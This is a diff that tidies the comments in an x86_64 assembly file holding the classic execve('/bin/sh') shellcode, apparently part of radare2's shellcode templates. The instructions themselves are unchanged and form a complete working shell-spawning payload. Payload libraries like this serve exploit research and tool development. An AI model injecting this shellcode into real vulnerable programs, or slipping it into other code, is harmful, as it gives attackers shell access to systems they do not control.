@@ -1,31 +1,17 @@
 ; x86_64 (64-bit) execve /bin/sh shellcode
 ; Assembly equivalent of the bytes originally stored in
 ; libr/egg/p/sc/src/x86_64-linux-binsh.c
-; This file is rasm2-friendly (Intel syntax).
 
-; xor eax, eax
 xor eax, eax
-; movabs rbx, 0xff978cd091969dd1
 movabs rbx, 0xff978cd091969dd1
-; neg rbx (results in /bin/sh string)
-neg rbx
-; push rbx
+neg rbx              ; results in /bin/sh string
 push rbx
-; push rsp
 push rsp
-; pop rdi
 pop rdi
-; cdq
 cdq
-; push rdx
 push rdx
-; push rdi
 push rdi
-; push rsp
 push rsp
-; pop rsi
 pop rsi
-; mov al, 0x3b (execve syscall number)
-mov al, 0x3b
-; syscall
+mov al, 0x3b        ; execve syscall number
 syscall
